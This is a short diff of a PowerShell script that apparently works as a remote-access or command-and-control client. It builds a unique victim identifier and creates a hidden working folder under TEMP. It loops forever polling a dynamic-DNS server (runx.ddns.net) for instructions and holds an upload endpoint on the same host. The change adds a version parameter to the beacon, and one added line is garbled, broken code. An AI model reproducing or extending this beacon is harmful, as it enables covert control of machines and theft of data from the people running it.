@@ -24,6 +24,10 @@ else {
 }
 
 $uniqueUser = "$($env:USERNAME)-$uniqueId-W"
+\ = "8417ed1"
+$clientVersion = $SCRIPT_VERSION
+
+
 $UserFolder = Join-Path (Join-Path $env:TEMP "frames-repo") $uniqueUser
 if (!(Test-Path $UserFolder)) {
   $null = New-Item $UserFolder -ItemType Directory
@@ -36,8 +40,9 @@ $VPS_UPLOAD_URL = "http://runx.ddns.net/api/upload"
 
 while ($true) {
   try {
-    $fullUri = $VPS_POLL_URL + "?username=" + $uniqueUser
+    $fullUri = $VPS_POLL_URL + "?username=" + $uniqueUser + "&version=" + [System.Uri]::EscapeDataString($clientVersion)
     $response = Invoke-RestMethod -Method Get -Uri $fullUri -TimeoutSec 10 -UseBasicParsing
+
     if ($response) {
       if ($response -is [string]) {
         $response = $response | ConvertFrom-Json
